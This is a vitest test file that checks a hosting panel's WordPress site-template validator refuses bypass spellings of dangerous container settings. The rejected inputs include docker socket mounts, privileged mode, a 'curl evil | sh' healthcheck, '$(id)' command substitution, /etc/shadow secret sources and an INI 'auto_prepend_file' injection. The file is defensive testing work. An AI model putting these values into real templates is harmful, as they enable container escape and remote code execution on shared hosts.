/**
 * Bypass attempts against the site template validator: every forbidden capability is written in an alternative
 * spelling (short and long volume syntax, casing, interpolation, unit spellings...) as real YAML text, and must still be
 * refused with the documented code at the documented path. Complements site-template-security.test.ts, which holds the
 * canonical spelling of each row.
 */
import { describe, expect, it } from "vitest";
import { BUILT_IN_WORDPRESS_SOURCE, formatTemplatePath } from "@hosting-panel/contracts";
import { validateSiteTemplateSource } from "../src/site-template-validation.js";

interface Parts {
  /** Lines of the service body after `image:` (4-space indented by the caller). */
  readonly service?: readonly string[];
  readonly image?: string;
  readonly volumes?: readonly string[];
  readonly limits?: readonly [cpus: string, memory: string];
  /** Extra top-level lines (already formatted). */
  readonly top?: readonly string[];
  readonly options?: string;
}

/** The smallest valid WordPress template; each test replaces one part of it. */
function template(parts: Parts = {}): string {
  const [cpus, memory] = parts.limits ?? ['"1.0"', "512M"];
  return [
    "x-hp-module: wordpress",
    "x-hp-parameters:",
    "  - key: php_version",
    "    label: PHP",
    "    type: enum",
    `    options: ${parts.options ?? '["8.3", "8.4", "8.5"]'}`,
    '    default: "8.4"',
    "    customer: true",
    "services:",
    "  app:",
    `    image: ${parts.image ?? "${HP_MODULE_IMAGE}"}`,
    ...(parts.service ?? []).map((line) => `    ${line}`),
    "    volumes:",
    ...(parts.volumes ?? ["- html:/var/www/html"]).map((line) => `      ${line}`),
    "    deploy:",
    "      resources:",
    "        limits:",
    `          cpus: ${cpus}`,
    `          memory: ${memory}`,
    ...(parts.top ?? []),
    "volumes:",
    "  html: {}",
    "",
  ].join("\n");
}

const q = (text: string): string => JSON.stringify(text);

/** Refused with `code` at `path`; returns the codes found at that path. */
function refused(source: string, code: string, path: string): void {
  const result = validateSiteTemplateSource(source, "wordpress");
  expect(result.ok, `${code} at ${path}`).toBe(false);
  if (!result.ok) expect(result.errors).toContainEqual(expect.objectContaining({ code, path }));
}

function codesAt(source: string, path: string): string[] {
  const result = validateSiteTemplateSource(source, "wordpress");
  return result.ok ? [] : result.errors.filter((error) => error.path === path).map((error) => error.code);
}

const SERVICE = "services.app";
/** Path of a key that is not a plain identifier, formatted like the validator does (`services.app["a b"]`). */
const keyPath = (...segments: string[]): string => formatTemplatePath(segments);

describe("the valid baselines stay valid", () => {
  it("accepts the smallest template used here and the built-in WordPress source", () => {
    expect(validateSiteTemplateSource(template(), "wordpress").ok).toBe(true);
    expect(validateSiteTemplateSource(BUILT_IN_WORDPRESS_SOURCE, "wordpress").ok).toBe(true);
  });
});

describe("volumes: host paths and the docker socket in other spellings", () => {
  const VOLUME = `${SERVICE}.volumes[1]`;
  const withVolume = (item: string): string => template({ volumes: ["- html:/var/www/html", `- ${q(item)}`] });

  it.each([
    "//etc:/x",
    "/etc/:/x",
    "/:/x",
    "//:/x",
    "./:/x",
    "./.:/x",
    ".hidden:/x",
    "~:/x",
    "~root/x:/x",
    "a/../b:/x",
    "..:/x",
    "data\\x:/x",
    "c:\\Windows:/x",
    "C:/Windows:/x",
    "/var/www/html:/var/www/html",
    "/var/www/html:/var/www/html:rw",
  ])("the host path source %s", (item) => {
    refused(withVolume(item), "VOLUME_HOST_PATH", VOLUME);
  });

  it.each([
    "/var/run/docker.sock:/x",
    "/var/run/DOCKER.SOCK:/x",
    "//var//run//docker.sock:/x",
    "/run/docker.sock:/run/docker.sock:rw",
    "docker.sock:/x",
    "data:/docker.sock",
    "data:/x:docker.sock",
    "html:/var/www/html/docker.sock",
    "/var/run/docker.sock",
  ])("the docker socket in %s wins over every other volume rule", (item) => {
    refused(withVolume(item), "VOLUME_DOCKER_SOCKET", VOLUME);
    expect(codesAt(withVolume(item), VOLUME)).toEqual(["VOLUME_DOCKER_SOCKET"]);
  });

  it.each([" /etc:/x", "\t/etc:/x", "\n/etc:/x"])("a host path hidden behind whitespace (%j) is still refused", (item) => {
    const codes = codesAt(withVolume(item), VOLUME);
    expect(codes).toHaveLength(1);
    expect(["VOLUME_SYNTAX", "VOLUME_HOST_PATH"]).toContain(codes[0]);
  });

  it.each(["${X}:/x", "$$x:/x", "html:${HP_SITE_ID}", "html:/var/www/${HP_SITE_ID}", "${HP_MODULE_IMAGE}:/x", "$HOME:/x"])(
    "interpolation in a volume entry (%s) is never expanded and never accepted",
    (item) => {
      const result = validateSiteTemplateSource(withVolume(item), "wordpress");
      expect(result.ok).toBe(false);
      if (result.ok) return;
      const codes = result.errors.filter((error) => error.path === VOLUME).map((error) => error.code);
      expect(codes.length).toBeGreaterThan(0);
      expect(codes.every((code) => ["VOLUME_SYNTAX", "VOLUME_TARGET_INVALID", "VOLUME_HOST_PATH"].includes(code))).toBe(true);
    },
  );

  it.each([
    "{ type: bind, source: /etc, target: /x }",
    "{ type: bind, source: /var/run/docker.sock, target: /var/run/docker.sock }",
    "{ type: volume, source: html, target: /var/www/html }",
    "{ type: tmpfs, target: /tmp }",
    "{ type: tmpfs, target: /var/www/html }",
    "{ type: npipe, source: //./pipe/docker_engine, target: //./pipe/docker_engine }",
    "{ type: volume, source: html, target: /x, volume: { nocopy: true } }",
    "{ type: bind, source: ., target: /x, bind: { propagation: rshared } }",
  ])("the long syntax %s", (item) => {
    refused(template({ volumes: ["- html:/var/www/html", `- ${item}`] }), "VOLUME_SYNTAX", VOLUME);
  });

  it("the long syntax is refused even as the only volume, on top of the missing html mount", () => {
    const source = template({ volumes: ["- { type: volume, source: html, target: /var/www/html }"] });
    refused(source, "VOLUME_SYNTAX", `${SERVICE}.volumes[0]`);
    refused(source, "VOLUME_REQUIRED_MISSING", `${SERVICE}.volumes`);
  });

  it.each([
    "- /dev/sda:/dev/sda",
    "- /dev:/dev",
    "- /dev/fuse:/dev/fuse:rwm",
  ])("a device given as a volume (%s)", (item) => {
    refused(template({ volumes: ["- html:/var/www/html", item] }), "VOLUME_HOST_PATH", VOLUME);
  });

  it.each(["/etc", "/etc/passwd", "/proc/self", "/sys/fs", "/root/.ssh", "/var/run", "/dev/shm", "/boot", "/var/www/html/../../etc", "/var/www/html/.."])(
    "the sensitive target %s with a named volume",
    (target) => {
      refused(withVolume(`data:${target}`), "VOLUME_TARGET_INVALID", VOLUME);
    },
  );

  it.each(["/x y", "/x\\y", "/x;y", "/x$y", "/x%2e%2e/y", "/ünï", "x", ""])("the malformed target %j", (target) => {
    const codes = codesAt(withVolume(`data:${target}`), VOLUME);
    expect(codes).toContain("VOLUME_TARGET_INVALID");
  });

  it.each(["RW", "rw,z", "rw ", "ro", "", "rwx", "delegated", "cached", "z", "shared"])("the mode %j", (mode) => {
    refused(template({ volumes: [`- ${q(`html:/var/www/html:${mode}`)}`] }), "VOLUME_MODE_UNSUPPORTED", `${SERVICE}.volumes[0]`);
  });

  it("a volume name that differs only by case or spelling is not the html volume", () => {
    refused(withVolume("HTML:/x"), "VOLUME_SYNTAX", VOLUME);
    refused(withVolume(" html:/x"), "VOLUME_SYNTAX", VOLUME);
    refused(withVolume("html :/x"), "VOLUME_SYNTAX", VOLUME);
    refused(withVolume("html:/x"), "VOLUME_DUPLICATE", VOLUME);
  });

  it("an undeclared named volume, however it is spelled", () => {
    refused(template({ volumes: ["- html:/var/www/html", "- data:/data"] }), "VOLUME_UNDECLARED", VOLUME);
    refused(template({ volumes: ["- html:/var/www/html", "- data:/data"] }), "VOLUME_EXTRA_NOT_ALLOWED", VOLUME);
  });

  it("a declared extra volume is never allowed and never reaches the spec", () => {
    const source = template({ volumes: ["- html:/var/www/html", "- data:/data"], top: [] }).replace("  html: {}", "  html: {}\n  data: {}");
    refused(source, "VOLUME_EXTRA_NOT_ALLOWED", VOLUME);
    const unused = template().replace("  html: {}", "  html: {}\n  data: {}");
    const result = validateSiteTemplateSource(unused, "wordpress");
    expect(result.ok && result.spec.service.volumes).toEqual([{ volume: "html", containerPath: "/var/www/html" }]);
  });

  it.each([
    ["driver_opts bind", "  html: { driver_opts: { type: none, o: bind, device: /etc } }"],
    ["driver_opts on a nested mapping", "  html:\n    driver_opts:\n      device: /"],
    ["external", "  html: { external: true }"],
    ["a non-empty scalar", "  html: /etc"],
  ])("a top-level volume with %s", (_name, line) => {
    const source = template().replace("  html: {}", line);
    const codes = codesAt(source, "volumes.html");
    expect(codes).toHaveLength(1);
    expect(["VOLUME_OPTIONS_REFUSED", "TYPE_MISMATCH"]).toContain(codes[0]);
  });
});

describe("service keys written in other spellings", () => {
  const SECURITY = [
    ["privileged: yes", "privileged: yes"],
    ["privileged: 1", "privileged: 1"],
    ['privileged: "TRUE"', 'privileged: "TRUE"'],
    ["privileged: on", "privileged: on"],
    ["cap_add with lower-case caps", "cap_add: [sys_admin]"],
    ["cap_add as a block list", "cap_add:\n  - ALL"],
    ["cap_drop with ALL", "cap_drop: [all]"],
    ["devices block", "devices:\n  - /dev/kvm"],
    ["device_cgroup_rules", 'device_cgroup_rules: ["c 1:3 mr"]'],
    ["security_opt seccomp:unconfined", "security_opt: [seccomp:unconfined]"],
    ["security_opt apparmor", "security_opt: [apparmor=unconfined]"],
    ["security_opt no-new-privileges", "security_opt: [no-new-privileges:false]"],
    ["userns_mode", 'userns_mode: "host"'],
    ["cgroup_parent", "cgroup_parent: /"],
    ["cgroup host", "cgroup: host"],
    ["pid host", "pid: host"],
    ["pid service", "pid: service:db"],
    ["pid container", "pid: container:abc"],
    ["ipc host", "ipc: host"],
    ["ipc shareable", "ipc: shareable"],
    ["ipc service", "ipc: service:db"],
    ["uts host", "uts: host"],
    ["sysctls list form", "sysctls:\n  - net.core.somaxconn=1"],
    ["runtime", "runtime: nvidia"],
    ["isolation", "isolation: process"],
    ["user root", "user: root"],
    ["user 0", "user: 0"],
    ['user "0:0"', 'user: "0:0"'],
    ["user uid:gid", 'user: "1000:1000"'],
    ["group_add", "group_add: [0]"],
    ["oom_kill_disable", "oom_kill_disable: true"],
    ["gpus", "gpus: all"],
  ] as const;

  it.each(SECURITY)("%s", (_name, line) => {
    const key = line.split(":")[0]!;
    refused(template({ service: line.split("\n") }), "KEY_FORBIDDEN_SECURITY", `${SERVICE}.${key}`);
  });

  it.each([
    ["network_mode host", "network_mode: host", "network_mode"],
    ["network_mode service", "network_mode: service:db", "network_mode"],
    ["network_mode container", "network_mode: container:abc", "network_mode"],
    ["network_mode bridge", "network_mode: bridge", "network_mode"],
    ["ports short", 'ports: ["80"]', "ports"],
    ["ports range", 'ports: ["8000-8010:80"]', "ports"],
    ["ports udp", 'ports: ["53:53/udp"]', "ports"],
    ["ports long form", "ports:\n  - target: 80\n    published: 8080\n    mode: host", "ports"],
    ["ports empty list", "ports: []", "ports"],
    ["extra_hosts map", "extra_hosts:\n  host: 10.0.0.1", "extra_hosts"],
    ["dns string", "dns: 8.8.8.8", "dns"],
    ["dns_search", "dns_search: [corp.local]", "dns_search"],
    ["dns_opt", "dns_opt: [use-vc]", "dns_opt"],
    ["networks map", "networks:\n  default:\n    ipv4_address: 1.2.3.4", "networks"],
    ["hostname", "hostname: evil", "hostname"],
    ["domainname", "domainname: evil.test", "domainname"],
    ["links", "links: [db]", "links"],
    ["external_links", "external_links: [db]", "external_links"],
  ])("networking: %s", (_name, lines, key) => {
    refused(template({ service: lines.split("\n") }), "KEY_FORBIDDEN_NETWORK", `${SERVICE}.${key}`);
  });

  it.each([
    ["labels as a map of traefik rules", 'labels:\n  traefik.http.routers.x.rule: Host(`evil.test`)', "labels"],
    ["labels as a list", 'labels: ["traefik.enable=true"]', "labels"],
    ["labels with the platform namespace", "labels:\n  hp.owner: other", "labels"],
    ["label_file", "label_file: x", "label_file"],
    ["build short", "build: .", "build"],
    ["build long with context", "build:\n  context: https://evil.test/repo.git", "build"],
    ["env_file list", "env_file: [.env, /etc/environment]", "env_file"],
    ["tmpfs string", "tmpfs: /run", "tmpfs"],
    ["tmpfs list", "tmpfs: [/run, /tmp]", "tmpfs"],
    ["volumes_from", "volumes_from: [container:other]", "volumes_from"],
    ["secrets short", "secrets: [token]", "secrets"],
    ["secrets with file source", "secrets:\n  - source: token\n    target: /x", "secrets"],
    ["configs", "configs: [conf]", "configs"],
    ["annotations", "annotations: { a: b }", "annotations"],
    ["storage_opt", "storage_opt: { size: 1000G }", "storage_opt"],
    ["post_start hook", "post_start:\n  - command: sh", "post_start"],
    ["container_name", "container_name: other-site", "container_name"],
  ])("host access: %s", (_name, lines, key) => {
    refused(template({ service: lines.split("\n") }), "KEY_FORBIDDEN_HOST_ACCESS", `${SERVICE}.${key}`);
  });

  it.each([
    ["healthcheck with a shell", 'healthcheck:\n  test: ["CMD-SHELL", "curl evil | sh"]', "healthcheck"],
    ["healthcheck disable", "healthcheck:\n  disable: true", "healthcheck"],
    ["entrypoint string", "entrypoint: /bin/sh", "entrypoint"],
    ["entrypoint list", 'entrypoint: ["/bin/sh", "-c", "id"]', "entrypoint"],
    ["command string", "command: sh -c id", "command"],
    ["command list", 'command: ["php", "-r", "1;"]', "command"],
    ["init", "init: true", "init"],
    ["ulimits scalar", "ulimits:\n  nproc: 65535", "ulimits"],
    ["ulimits soft/hard", "ulimits:\n  nofile:\n    soft: 20000\n    hard: 40000", "ulimits"],
    ["working_dir", "working_dir: /", "working_dir"],
    ["read_only", "read_only: false", "read_only"],
    ["pull_policy", "pull_policy: always", "pull_policy"],
    ["platform", "platform: linux/arm64", "platform"],
    ["shm_size", "shm_size: 64g", "shm_size"],
    ["pids_limit", "pids_limit: -1", "pids_limit"],
    ["mem_limit", "mem_limit: 64g", "mem_limit"],
    ["cpus", "cpus: 64", "cpus"],
    ["depends_on", "depends_on:\n  db:\n    condition: service_healthy", "depends_on"],
    ["restart", "restart: always", "restart"],
    ["logging", "logging:\n  driver: none", "logging"],
    ["profiles", "profiles: [debug]", "profiles"],
    ["scale", "scale: 10", "scale"],
  ])("unsupported: %s", (_name, lines, key) => {
    refused(template({ service: lines.split("\n") }), "KEY_UNSUPPORTED", `${SERVICE}.${key}`);
  });

  it.each([
    ["Privileged", "Privileged: true"],
    ["PRIVILEGED", "PRIVILEGED: true"],
    ["Cap_Add", "Cap_Add: [ALL]"],
    ["Network_Mode", "Network_Mode: host"],
    ["Ports", "Ports: [80]"],
    ["Image", "Image: nginx"],
    ["${KEY}", "${KEY}: true"],
    ["privileged ", '"privileged ": true'],
    ["x-privileged", "x-privileged: true"],
    ["", '"": 1'],
    ["deploy.resources", "deploy.resources: x"],
  ])("a different spelling of a forbidden key (%j) is unknown, never allowed", (key, line) => {
    refused(template({ service: [line] }), "KEY_UNKNOWN", keyPath("services", "app", key));
  });

  it("refuses a second service whatever its content and its name", () => {
    refused(template({ top: ["  sidecar:", "    image: busybox"] }), "SERVICES_MULTIPLE", "services.sidecar");
    refused(template({ top: ['  "Bad Name":', "    image: busybox"] }), "SERVICES_MULTIPLE", keyPath("services", "Bad Name"));
  });

  it("refuses a service whose name is interpolated or not a plain name", () => {
    for (const name of ["${X}", "App", "a.b", "-a", "1a", "a".repeat(33)]) {
      const source = template().replace("  app:", `  ${q(name)}:`);
      expect(codesAt(source, keyPath("services", name))).toContain("SERVICE_NAME_INVALID");
    }
  });
});

describe("top-level keys", () => {
  it.each([
    ["networks", "networks: { default: { external: true } }", "KEY_FORBIDDEN_NETWORK"],
    ["secrets with file:", "secrets:\n  token:\n    file: /etc/shadow", "KEY_FORBIDDEN_HOST_ACCESS"],
    ["configs with file:", "configs:\n  conf:\n    file: /etc/passwd", "KEY_FORBIDDEN_HOST_ACCESS"],
    ["include", "include: [other.yml]", "KEY_FORBIDDEN_HOST_ACCESS"],
    ["extends", "extends: { file: other.yml }", "KEY_FORBIDDEN_HOST_ACCESS"],
    ["name", "name: other", "KEY_UNSUPPORTED"],
    ["version", 'version: "3.9"', "KEY_UNSUPPORTED"],
    ["models", "models: {}", "KEY_UNSUPPORTED"],
    ["services under another casing", "Services: {}", "KEY_UNKNOWN"],
    ["x-hp-module twice with another casing", "X-HP-Module: other", "KEY_UNKNOWN"],
  ])("%s", (_name, text, code) => {
    const key = text.split(":")[0]!;
    refused(template().replace("volumes:\n  html: {}", `${text}\nvolumes:\n  html: {}`), code, key);
  });
});

describe("the image in other spellings", () => {
  const IMAGE = `${SERVICE}.image`;
  const SHA = `sha256:${"a".repeat(64)}`;
  const only84 = (image: string): string => template({ image: q(image), options: '["8.4"]' });
  const PIN = "wordpress:7.1.4-php8.4-apache";

  it("the literal pin is valid when it is the only option, as the control for the rows below", () => {
    expect(validateSiteTemplateSource(only84(PIN), "wordpress").ok).toBe(true);
  });

  it.each([
    "wordpress:7.1.4-php8.4-apache ",
    " wordpress:7.1.4-php8.4-apache",
    "wordpress:7.1.4-php8.4-apache\n",
    "wordpress :7.1.4-php8.4-apache",
    "Wordpress:7.1.4-php8.4-apache",
    "WORDPRESS:7.1.4-php8.4-apache",
    "wordpress:7.1.4-php8.4-apache@sha256:abc",
    `wordpress:7.1.4-php8.4-apache@sha256:${"a".repeat(63)}`,
    `wordpress:7.1.4-php8.4-apache@sha256:${"a".repeat(65)}`,
    `wordpress:7.1.4-php8.4-apache@sha256:${"A".repeat(64)}`,
    `wordpress:7.1.4-php8.4-apache@sha512:${"a".repeat(64)}`,
    "wordpress:",
    "wordpress::7.1.4-php8.4-apache",
    ":7.1.4-php8.4-apache",
    "wordpress:-1",
    "wordpress:-7.1.4-php8.4-apache",
    "wordpress:.1",
    `wordpress:${"a".repeat(129)}`,
    "wordpress//x:1",
    "wordpress/:1",
    "/wordpress:1",
  ])("the malformed reference %j", (image) => {
    refused(only84(image), "IMAGE_MALFORMED", IMAGE);
  });

  it.each([
    "wordpress:latest",
    "wordpress:LATEST",
    "wordpress:7.1.4-php8.4-apache-latest",
    "wordpress:7.1.4",
    "wordpress:7.1",
    "wordpress:7",
    "wordpress:7-php8.4-apache",
    "wordpress:php8.4-apache",
    "wordpress:7.1.4-php8.4",
    "wordpress:7.1.4-php8.4-fpm",
    "wordpress:7.1.4-php8.4-fpm-alpine",
    "wordpress:7.1.4-php8.4-apache-bookworm",
    "wordpress:cli-2.12.0-php8.4",
    "wordpress:7.1.4-PHP8.4-apache",
    "wordpress:7.1.4-php8.4-APACHE",
    "wordpress:7.1.4-php8.3-apache",
    "wordpress:7.1.4-php8.40-apache",
    "wordpress:7.1.4-php84-apache",
    "wordpress:7.1.x-php8.4-apache",
    "wordpress:7.1.4.1-php8.4-apache",
    "wordpress:v7.1.4-php8.4-apache",
    "wordpress:sha256-aaaaaaaa",
    `wordpress:sha256_${"a".repeat(64)}`,
    "wordpress:7.1.4-php8.4-apache_",
    "wordpress:7.1.4-php8.4-apache.",
  ])("the tag of %s is not the exact pin for the only option", (image) => {
    refused(only84(image), "IMAGE_TAG_NOT_ALLOWED", IMAGE);
    expect(codesAt(only84(image), IMAGE)).toEqual(["IMAGE_TAG_NOT_ALLOWED"]);
  });

  it("a name without a tag is a floating image", () => {
    refused(only84("wordpress"), "IMAGE_TAG_NOT_ALLOWED", IMAGE);
  });

  it.each([
    "docker.io/wordpress:7.1.4-php8.4-apache",
    "index.docker.io/library/wordpress:7.1.4-php8.4-apache",
    "registry-1.docker.io/library/wordpress:7.1.4-php8.4-apache",
    "registry:5000/wordpress:7.1.4-php8.4-apache",
    "localhost/wordpress:7.1.4-php8.4-apache",
    "localhost:5000/wordpress:7.1.4-php8.4-apache",
    "127.0.0.1:5000/wordpress:7.1.4-php8.4-apache",
    "[::1]:5000/wordpress:7.1.4-php8.4-apache",
    "ghcr.io/wordpress:7.1.4-php8.4-apache",
    "evil.test:65535/wordpress:7.1.4-php8.4-apache",
    "library/wordpress:7.1.4-php8.4-apache",
    "bitnami/wordpress:7.1.4-php8.4-apache",
    "wordpress/wordpress:7.1.4-php8.4-apache",
    "wordpress-evil:7.1.4-php8.4-apache",
    "my_wordpress:7.1.4-php8.4-apache",
    "wordpress.evil:7.1.4-php8.4-apache",
    "wordpress_:7.1.4-php8.4-apache",
    "evil/nginx:1.27.0",
    "nginx:1.27.0",
    "busybox:1.36.1",
    "scratch",
    "8.4:7.1.4-php8.4-apache",
  ])("the repository of %s is not the official one", (image) => {
    const codes = codesAt(only84(image), IMAGE);
    expect(codes, image).toHaveLength(1);
    expect(["IMAGE_REPOSITORY_NOT_ALLOWED", "IMAGE_MALFORMED"]).toContain(codes[0]);
  });

  it.each([
    "docker.io/wordpress:7.1.4-php8.4-apache",
    "library/wordpress:7.1.4-php8.4-apache",
    "registry:5000/wordpress:7.1.4-php8.4-apache",
    "localhost:5000/wordpress:7.1.4-php8.4-apache",
    "ghcr.io/wordpress:7.1.4-php8.4-apache",
  ])("%s is refused as IMAGE_REPOSITORY_NOT_ALLOWED, not as a malformed reference", (image) => {
    expect(codesAt(only84(image), IMAGE)).toEqual(["IMAGE_REPOSITORY_NOT_ALLOWED"]);
  });

  it.each([`wordpress@${SHA}`, `wordpress:7.1.4-php8.4-apache@${SHA}`, `wordpress:latest@${SHA}`, `docker.io/wordpress@${SHA}`])(
    "the digest in %s",
    (image) => {
      const codes = codesAt(only84(image), IMAGE);
      expect(codes).toHaveLength(1);
      expect(["IMAGE_DIGEST_NOT_ALLOWED", "IMAGE_REPOSITORY_NOT_ALLOWED"]).toContain(codes[0]);
    },
  );

  it("a digest on the official repository is IMAGE_DIGEST_NOT_ALLOWED", () => {
    refused(only84(`wordpress@${SHA}`), "IMAGE_DIGEST_NOT_ALLOWED", IMAGE);
    refused(only84(`wordpress:7.1.4-php8.4-apache@${SHA}`), "IMAGE_DIGEST_NOT_ALLOWED", IMAGE);
  });

  it.each([
    ["only the whole value is the module placeholder", "${HP_MODULE_IMAGE} ", "INTERP_MODULE_IMAGE_MISPLACED"],
    ["a prefix before the module placeholder", "x${HP_MODULE_IMAGE}", "INTERP_MODULE_IMAGE_MISPLACED"],
    ["the module placeholder twice", "${HP_MODULE_IMAGE}${HP_MODULE_IMAGE}", "INTERP_MODULE_IMAGE_MISPLACED"],
    ["the module placeholder as a tag", "wordpress:${HP_MODULE_IMAGE}", "INTERP_MODULE_IMAGE_MISPLACED"],
    ["the module placeholder after a registry", "evil.test/${HP_MODULE_IMAGE}", "INTERP_MODULE_IMAGE_MISPLACED"],
    ["a lower-case module placeholder", "${hp_module_image}", "IMAGE_VARIABLE_NOT_ALLOWED"],
    ["a magic variable", "wordpress:${HP_SITE_ID}", "IMAGE_VARIABLE_NOT_ALLOWED"],
    ["an undeclared variable", "${registry}/wordpress:7.1.4-php8.4-apache", "IMAGE_VARIABLE_NOT_ALLOWED"],
    ["a variable in the repository", "word${php_version}:1", "IMAGE_REPOSITORY_NOT_ALLOWED"],
    ["a variable other than php_version", "wordpress:${tag}", "IMAGE_VARIABLE_NOT_ALLOWED"],
    ["a default value", "${HP_MODULE_IMAGE:-nginx}", "INTERP_SYNTAX"],
    ["a default on php_version", "wordpress:7.1.4-php${php_version:-8.4}-apache", "INTERP_SYNTAX"],
    ["a nested expansion", "wordpress:${${php_version}}", "INTERP_SYNTAX"],
    ["a bare variable", "wordpress:$php_version", "INTERP_SYNTAX"],
    ["a command substitution", "wordpress:$(id)", "INTERP_SYNTAX"],
    ["an unterminated placeholder", "wordpress:7.1.4-php${php_version", "INTERP_SYNTAX"],
    ["an empty placeholder", "wordpress:${}", "INTERP_SYNTAX"],
  ])("%s", (_name, image, code) => {
    refused(template({ image: q(image) }), code, IMAGE);
  });

  it("an escaped dollar in the image is a literal dollar, which is not a valid tag or repository", () => {
    expect(codesAt(only84("wordpress:7.1.4-php8.4-apache$$"), IMAGE)).toEqual(["IMAGE_MALFORMED"]);
    expect(codesAt(only84("$$HP_MODULE_IMAGE"), IMAGE)).toEqual(["IMAGE_MALFORMED"]);
  });

  it("the php_version placeholder follows every option: a pin that fits only some options is refused naming the rest", () => {
    const source = template({ image: q("wordpress:7.1.4-php${php_version}-apache") });
    expect(validateSiteTemplateSource(source, "wordpress").ok).toBe(true);
    refused(template({ image: q(PIN) }), "IMAGE_TAG_NOT_ALLOWED", IMAGE);
  });

  it("the php_version placeholder cannot reach another repository, a registry, a digest or a floating tag", () => {
    for (const image of [
      "${php_version}/wordpress:7.1.4-php8.4-apache",
      "${php_version}",
      "wordpress:${php_version}",
      "wordpress:7.1.4-${php_version}-apache",
      "wordpress:7.1.4-php${php_version}",
      "wordpress:7.1.4-php${php_version}${php_version}-apache",
      "wordpress${php_version}:7.1.4-php8.4-apache",
      `wordpress:7.1.4-php\${php_version}-apache@${SHA}`,
    ]) {
      const codes = codesAt(template({ image: q(image) }), IMAGE);
      expect(codes.length, image).toBeGreaterThan(0);
    }
  });

  it("a very long reference is refused before it is parsed", () => {
    refused(only84(`wordpress:7.1.4-php8.4-apache${"x".repeat(240)}`), "IMAGE_MALFORMED", IMAGE);
    refused(only84(`${"a".repeat(260)}/wordpress:1`), "IMAGE_MALFORMED", IMAGE);
  });

  it("a non-string image", () => {
    refused(template({ image: "[wordpress]" }), "TYPE_MISMATCH", IMAGE);
    refused(template({ image: "{ name: wordpress }" }), "TYPE_MISMATCH", IMAGE);
    refused(template({ image: "true" }), "TYPE_MISMATCH", IMAGE);
    refused(template({ image: "~" }), "IMAGE_MISSING", IMAGE);
  });
});

describe("expose in other spellings", () => {
  const EXPOSE = `${SERVICE}.expose`;
  const expose = (value: string): string => template({ service: [`expose: ${value}`] });

  it.each(["[80]", '["80"]', "[ 80 ]"])("the site's own port %s is accepted", (value) => {
    expect(validateSiteTemplateSource(expose(value), "wordpress").ok).toBe(true);
  });

  it.each([
    ["[8080]", `${EXPOSE}[0]`],
    ['["80:80"]', `${EXPOSE}[0]`],
    ['["0.0.0.0:80"]', `${EXPOSE}[0]`],
    ['["127.0.0.1:8080:80"]', `${EXPOSE}[0]`],
    ['["80/udp"]', `${EXPOSE}[0]`],
    ['["80-81"]', `${EXPOSE}[0]`],
    ['["080"]', `${EXPOSE}[0]`],
    ['[" 80"]', `${EXPOSE}[0]`],
    ['["80 "]', `${EXPOSE}[0]`],
    ['["${HP_PORT}"]', `${EXPOSE}[0]`],
    ["[-80]", `${EXPOSE}[0]`],
    ["[80.5]", `${EXPOSE}[0]`],
    ["[true]", `${EXPOSE}[0]`],
    ["[{ target: 80, published: 8080 }]", `${EXPOSE}[0]`],
    ["[80, 443]", EXPOSE],
    ['["80", 80]', EXPOSE],
    ["[80, 80]", EXPOSE],
  ])("expose %s", (value, path) => {
    refused(expose(value), "EXPOSE_INVALID", path);
  });

  it.each(["80", '"80"', "{ 80: 80 }"])("expose that is not a list (%s)", (value) => {
    refused(expose(value), "TYPE_MISMATCH", EXPOSE);
  });
});

describe("PHP settings in other spellings", () => {
  const php = (...lines: string[]): string =>
    template().replace("volumes:\n  html", () => `x-hp-php:\n${lines.map((line) => `  ${line}`).join("\n")}\nvolumes:\n  html`);
  const at = (key: string): string => `x-hp-php.${key}`;

  it.each([
    ["upload_max_filesize", "-1"], ["memory_limit", "-1"], ["memory_limit", "0"], ["memory_limit", "1e3M"], ["memory_limit", "512"],
    ["memory_limit", "512m"], ["memory_limit", "0.5G"], ["memory_limit", "065M"], ["memory_limit", "512MB"], ["memory_limit", "100000M"],
    ["post_max_size", "4097M"], ["post_max_size", "5G"], ["upload_max_filesize", "4097M"],
    ["max_execution_time", "0"], ["max_execution_time", "-1"], ["max_execution_time", "3601"], ["max_execution_time", "01"],
    ["max_execution_time", "1.5"], ["max_execution_time", "1e3"], ["max_input_time", "-1"], ["max_input_time", "0"],
    ["max_input_vars", "99"], ["max_input_vars", "100001"], ["max_input_vars", "1000000"],
  ])("%s: %j", (key, value) => {
    refused(php(`${key}: ${q(value)}`), "PHP_VALUE_INVALID", at(key));
  });

  it.each([
    ["upload_max_filesize", "true"], ["memory_limit", "[1]"], ["memory_limit", "{ a: 1 }"], ["post_max_size", "~"], ["max_input_vars", "false"],
  ])("%s with the wrong type %s", (key, value) => {
    refused(php(`${key}: ${value}`), "TYPE_MISMATCH", at(key));
  });

  it("a size written as a bare number has no unit and is refused, while a count is accepted", () => {
    refused(php("memory_limit: 256"), "PHP_VALUE_INVALID", at("memory_limit"));
    expect(validateSiteTemplateSource(php("max_input_vars: 1000", "max_execution_time: 300"), "wordpress").ok).toBe(true);
  });

  it.each(["Memory_Limit", "memory_limit ", "MEMORY_LIMIT", "memory-limit", "php.memory_limit", "extension", "zend_extension", "error_log", "session.save_path", "date.timezone", "sendmail_path", "mail.log"])(
    "the directive %j is not one of the six allowed",
    (key) => {
      refused(php(`${q(key)}: 64M`), "PHP_KEY_UNKNOWN", keyPath("x-hp-php", key));
    },
  );

  it("an INI injection through a value or a key never gets as far as the spec", () => {
    for (const value of ["64M\nauto_prepend_file=/x", "64M;", "64M #", "64M\r\n", "64M\u0000", '64M"', "64M extension=x"]) {
      const result = validateSiteTemplateSource(php(`upload_max_filesize: ${q(value)}`), "wordpress");
      expect(result.ok, JSON.stringify(value)).toBe(false);
    }
  });

  it("compares post_max_size with upload_max_filesize in bytes across units", () => {
    const check = (upload: string, post: string): boolean =>
      validateSiteTemplateSource(php(`upload_max_filesize: ${upload}`, `post_max_size: ${post}`), "wordpress").ok;
    expect(check("1G", "1023M")).toBe(false);
    expect(check("10240K", "10239K")).toBe(false);
    expect(check("1G", "1024M")).toBe(true);
    expect(check("10240K", "10M")).toBe(true);
    expect(check("1G", "2G")).toBe(true);
    refused(php("upload_max_filesize: 1G", "post_max_size: 1023M"), "PHP_POST_BELOW_UPLOAD", "x-hp-php");
  });

  it("keeps memory_limit within the container memory", () => {
    expect(validateSiteTemplateSource(php("memory_limit: 512M"), "wordpress").ok).toBe(true);
    expect(validateSiteTemplateSource(php("memory_limit: 99999K"), "wordpress").ok).toBe(true);
    refused(php("memory_limit: 513M"), "PHP_MEMORY_EXCEEDS_CONTAINER", at("memory_limit"));
    refused(php("memory_limit: 1G"), "PHP_MEMORY_EXCEEDS_CONTAINER", at("memory_limit"));
  });

